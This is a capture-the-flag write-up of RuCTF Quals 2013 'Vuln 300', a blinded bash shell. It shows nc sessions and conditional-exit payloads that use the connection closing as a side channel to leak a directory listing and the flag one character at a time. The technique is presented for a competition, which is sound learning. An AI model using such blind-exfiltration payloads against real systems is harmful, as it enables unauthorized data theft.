---
title: "RuCTF Quals 2013: Vuln 300"
categories: ctf
layout: post
---

    $ nc aloneinthedark.quals.ructf.org 3255
    Mighty Bash is restricted and blinded. But it still can obtain the power!

This problem presents a "blinded" bash shell -- you can submit commands, which are executed, but you don't get to read their output.

We found that there was, however, a way to get information out -- if you terminate the shell, the underlying TCP connection is closed.

    $ nc aloneinthedark.quals.ructf.org 3255
    Mighty Bash is restricted and blinded. But it still can obtain the power!
    exit
    $

And you can make that exit conditional, as long as you only use bash builtins:

    $ nc aloneinthedark.quals.ructf.org 3255
    Mighty Bash is restricted and blinded. But it still can obtain the power!
    [ -d fnord ] && exit
    [ -d . ] && exit
    $

Well, then!  We can exfiltrate the flag out, bit by bit.  The basic idea is this:  Execute a command; store its output in a variable; check to see if the character at a certain index of that output is equal to a guessed character.

    $ nc aloneinthedark.quals.ructf.org 3255
    Mighty Bash is restricted and blinded. But it still can obtain the power!
    out="$(echo *)"
    [ "A" == "${out:0:1}" ] && exit
    [ "B" == "${out:0:1}" ] && exit
    [ "C" == "${out:0:1}" ] && exit
    [ "D" == "${out:0:1}" ] && exit
    [ "E" == "${out:0:1}" ] && exit
    [ "F" == "${out:0:1}" ] && exit
    $

We wrote a [quick and dirty script to automate this][lol.py].  And, after many minutes of waiting, we had our flag:

    $ python lol.py "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz ._-+" 'out="$(echo *)"'
    FLAG_NOGUESSING bin lib64 lost+found
    $ python lol.py "0123456789abcdef" "read out < FLAG_NOGUESSING"
    7c2b867e94f75bcb9a8e9cdf67e7a334

Of course, it turns out that there was a [much more straight-forward way][omfg] -- but hey, a flag's a flag, right?

[lol.py]: /postfiles/2013-03-13-ructf-quals-vuln-300/lol.py
[omfg]: http://peterpen-ctf.net/?p=476